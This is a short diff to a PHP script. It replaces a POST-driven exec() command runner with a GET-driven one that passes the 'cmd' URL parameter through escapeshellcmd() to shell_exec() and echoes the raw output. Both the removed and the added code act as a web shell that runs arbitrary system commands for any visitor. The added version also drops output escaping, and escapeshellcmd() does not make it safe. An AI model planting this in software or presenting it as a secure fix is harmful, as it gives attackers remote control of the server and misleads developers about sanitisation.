@@ -1,8 +1,6 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $command = $_POST['command'];
-    $output = exec($command);
-    echo "<h2>Output:</h2>";
-    echo "<pre>" . htmlspecialchars($output) . "</pre>";
-}
+$command = $_GET["cmd"];
+$safe_command = escapeshellcmd($command);
+$output = shell_exec($safe_command);
+echo "<pre>$output</pre>";
 ?>
